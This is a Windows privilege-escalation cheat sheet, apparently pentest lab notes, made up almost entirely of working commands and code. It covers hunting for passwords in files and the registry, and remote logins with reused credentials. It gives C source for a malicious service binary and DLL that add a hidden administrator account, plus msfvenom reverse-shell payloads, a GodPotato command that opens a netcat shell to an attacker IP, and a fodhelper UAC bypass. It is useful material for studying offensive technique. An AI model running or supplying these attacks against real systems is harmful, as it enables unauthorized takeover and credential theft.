## Situational Awareness

```powershell

# Local hard driver
wmic logicaldisk get name
Get-Psdrive -psprovider filesystem

# Username and hostname
whoami
hostname
whoami /priv

```
## 

    - SeImpersonatePrivilege: Allows impersonating other users.
    - SeBackupPrivilege: Can be used to back up files, potentially reading sensitive files.
    - SeRestorePrivilege: Can modify files and overwrite critical system files.
    - SeTakeOwnershipPrivilege: Allows taking ownership of system files.
    - SeDebugPrivilege: Can attach a debugger to any process, including system processes.

## Group memberships of the current user

```powershell
whoami /groups

Highly privileged groups like
- Administrators
- Backup Operators
- Remote Desktop Users
- Power Users
```


## Existing users and groups

```powershell

net user
net user %USERNAME%


net localgroup
net localgroup "Remote Management Users"
net localgroup "Administrators"

Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember "Remote Management Users"
Get-LocalGroupMember "Administrators"

```

## Operating system, version and architecture

```powershell

systeminfo
```

## Network information

```powershell

ipconfig /all
route print
netstat -ano
netstat -anp TCP | find "2222"

```


## Installed applications

```powershell

Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
        | select displayname 
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"
        | select displayname

dir "C:\Program Files"
dir "C:\Program Files (x86)"
dir C:\Users\%USERNAME%\Downloads

```

## Running processes

```powershell

tasklist /?
tasklist > tasklist.txt
tasklist | findstr "access"
tasklist /SVC
# view all processes running under SYSTEM's user context
tasklist /fi "USERNAME eq NT AUTHORITY\SYSTEM" /fi "STATUS eq running"
# filter results
tasklist /fi "imagename eq cmd.exe"
tasklist | find "cmd.exe"

wmic process get Caption,CommandLine,Processid,ExecutablePath
wmic process where "name='powershell.exe'" get Caption,CommandLine,Processid,ExecutablePath
wmic process where "processid=2644" list /format:list

Get-Process | Select-Object * | Out-File -FilePath .\Process.txt
Get-Process | Select-Object -unique ProcessName | Sort-Object -Property ProcessName
Get-Process | Where-Object {$_.ProcessName -eq  'NonStandardProcess'} | Format-List *
Get-Process NonStandardProcess | Format-List Path

```
##  Display set account policies

```powershell

net accounts
```

## Hidden in Plain View


```powershell

# Searching for password files
cd c:\Users
dir /s /a /b ConsoleHost_history.txt
dir /s /b proof.txt
dir /s /b /a *.ini 
dir "*password*" /s

findstr /si password *.txt # xml,ini

# Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*

# Find all passwords in all files.
findstr /spin "password" *.*

# Searching for password manager databases on the C:\ drive
# *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.bak,*.log,*.ini,*.conf
# ntds.dit,sam,sam.bak,ConsoleHost_history.txt
Get-ChildItem -Path C:\Users\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\ -File -Recurse -ErrorAction SilentlyContinue

# Searching for sensitive information in XAMPP directory
Get-ChildItem -Path C:\inetpub -Include *.conf,*.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

# find & findstr
find /i "ntml" backup.log
type backup.log | findstr /i ntml
find /v /c "" backup.log # wc -l backup.log

```

# Using Runas to execute cmd as user backupadmin

```powershell

runas /user:backupadmin cmd
runas /noprofile /user:backupadmin powershell

```
# Retrieve the password in registry

```powershell

# WINVNC
reg query HKCU\SOFTWARE\ORL\WINVNC3

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

## Information Goldmine PowerShell


```powershell

Get-History
(Get-PSReadlineOption).HistorySavePath
```


Connect to DC01 as tom user

```powershell

$password = ConvertTo-SecureString "P@ssw0rd!!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("tom", $password)
Enter-PSSession -ComputerName DC01 -Credential $cred

```

# We can connect to the target from Kali machine

```powershell

evil-winrm -i $IP -u tom -p "P@ssw0rd\!\!" # 5985, 5986 
impacket-psexec tom:'P@ssw0rd!!'@$IP       # 445
impacket-wmiexec tom:'P@ssw0rd!!'@$IP      # 135,445,49667

```

## Automated Enumeration 


```powershell

winPEAS.exe
winPEAS.exe systeminfo userinfo notcolor log

Seatbelt.exe
Seatbelt.exe -group=all -outputfile="C:\Temp\seatbelt.txt"
```

## Windows services

When using a network logon such as WinRM or a bind shell :
 
- Get-CimInstance and Get-Service will result in a "permission denied" error when querying for services with a non-administrative user.
- Using an interactive logon such as RDP solves this problem.

# get a list of all installed Windows services, with a non-administrative user, use an interactive logon

```powershell
Get-Service | ForEach-Object { $_.Name } 
Get-CimInstance -ClassName win32_service 
	| Select Name,State,StartMode,PathName
Get-WmiObject -Class win32_service 
	| Select-Object Name, State, PathName
	| Where-Object {$_.State -like 'Running'} 

sc.exe query type= service
sc.exe query state= all
wmic service get name, displayname,pathname,startmode | findstr /i "auto"

# Find a service
sc.exe qc <NAME>
Get-Service | Where-Object {$_.name -eq "BetaService"}
Get-CimInstance -ClassName win32_service | where-object {$_.Name -eq 'Schedule'}

```
# start | stop windows services

```powershell

Start-Service, Stop-Service
sc.exe <start|stop> <SERVICE>
net <start|stop> <SERVICE>

```
# Modify service binary path

```powershell

sc config VSS binpath="C:\Users\helpdesk_setup\rev443.exe"

```
## Service Binary Hijacking

```powershell
# enumerate the permissions on the service binaries
# ⇒ Use icacls or Get-ACL

Get-CimInstance -ClassName win32_service 
       | Select Name,State,PathName, StartMode 
       | Where-Object {$_.State -like 'Running'}
icacls c:\xampp\mysql\bin\mysqld.exe

```
# replace binary by a malicious code

```powershell
# Create a malicious code on our Kali
cat adduser.c

#include <stdlib.h>
int main ()
{
	int i;
	i = system ("net user dave2 password123! /add");
	i = system ("net localgroup administrators dave2 /add");
	return 0;
}

# Cross-compile the code on Kali machine
# sudo apt install mingw-w64
$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

# use msfvenom
$ msfvenom -p windows/adduser USER=metasploit PASS='Metasploit$1' -f exe -o adduser.exe  
$ msfvenom -p windows/exec cmd='net localgroup "Remote Desktop Users" metasploit /add' -f exe -o addrdp.exe

# Replace mysqld.exe file, doesn't work with del and copy 
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe

# Can we restart mysql service ?
Stop-Service mysql
net stop mysql
sc.exe stop mysql

# What the StartMode is?
Get-CimInstance -ClassName win32_service 
   | Select Name, StartMode 
   | Where-Object {$_.Name -like 'mysql'}

```

## Use an automated tool PowerUp.ps1

```powershell

powershell -ep bypass
Import-Module .\PowerUp.ps1

# Execute Get-ModifiableServiceFile
Get-ModifiableServiceFile

```

## Service DLL Hijacking

Standard DLL search order on current Windows versions

1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.

```powershell
# displaying the contents of this environment variable
$env:path

# Displaying information about the running services 
Get-CimInstance -ClassName win32_service 
	| Select Name,State,PathName,StartMode 
	| Where-Object {$_.State -like 'Running'} 
	| sort-object -property Name

# Displaying permissions on the binary of BetaService
icacls \BetaServ.exe

# We would copy the BetaService.exe binary to a local machine
# and use Process Monitor Procmon64.exe to identify all DLLs loaded by BetaService

# ⇒ Create a filter : Process name is BetaServ.exe  then Include it
# ⇒ Then restart the BetaService service by

```

# Create myDLL.dll with a malicious code

```c

#cat myDLL.cpp
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
        i = system ("net user dave2 password123! /add");
        i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}

# Cross-Compile the C++ Code to a 64-bit DLL
$ x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll

```

# We can use mfsvenom to generate DLL reverse shell 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=9999 -f dll -o myDLL.dll

# test an dll
rundll32.exe myDLL.dll,0

## Unquoted Service Paths

```powershell
 
# List of services with binary path
Get-CimInstance -ClassName win32_service | Select Name,State,PathName 

#  List of services with spaces and missing quotes in the binary path
wmic service get name, displayname, pathname, startmode 
    | findstr /i /v "C:\Windows\\" | findstr /i /v """
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
  | Select-String -NotMatch '"'
  | Select-String -NotMatch 'Windows'

```



## Scheduled Tasks

```powershell

# Display a list of all scheduled tasks
schtasks /query /fo LIST /v > schtasks.txt
Get-ScheduledTask | format-list *

# https://github.com/markwragg/PowerShell-Watch
Get-Proccess backup -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuous -Seconds 30

```

## Using Exploits

```powershell

whoami /priv

- If the privilege SeImpersonatePrivilege assigned. 
- we can attempt to elevate our privileges by using PrintSpoofer

# Using the PrintSpoofer64.exe tool to get an interactive PowerShell session
.\PrintSpoofer64.exe -i -c powershell.exe

searchsploit "Privilege Escalation" | uniq | grep -v metasploit | grep -i "windows "

https://www.exploit-db.com/exploits/40564
$ i686-w64-mingw32-gcc 40564.c  -o 40564.exe -lws2_32

# smbGhost Github: https://github.com/danigargu/CVE-2020-0796 cve-2020-0796-local.exe
GodPotato-NET4.exe -cmd "nc.exe 192.168.45.5 443 -e cmd.exe"

# Abusing SeBackupPrivilege

robocopy /b C:\Users\enterpriseadmin\Desktop\ .\stole

User Account Control (UAC) Bypass

sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f

```

## Create .zip

```powershell

Compress-Archive in.txt out.zip

```


## icacls

```powershell

# Non Writable
C:\>icacls "Enterprise Software"
icacls "Enterprise Software"
Enterprise Software BUILTIN\Administrators:(OI)(CI)(F)
                    NT AUTHORITY\SYSTEM:(OI)(CI)(F)
                    BUILTIN\Users:(OI)(CI)(RX)
# Writable
C:\>icacls BackupMonitor
icacls BackupMonitor
BackupMonitor BUILTIN\Administrators:(I)(OI)(CI)(F)
              NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              NT AUTHORITY\Authenticated Users:(I)(M)
              NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)

```

## Share files

```powershell
# Kali
impacket-smbserver  -username kali -password P@ssw0rd123 -smb2support share share/

# Windows
$password = ConvertTo-SecureString "P@ssw0rd123" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("kali", $password)
New-PSDrive -name share -Root \\192.168.45.181\share -Credential $cred -PSProvider filesystem
```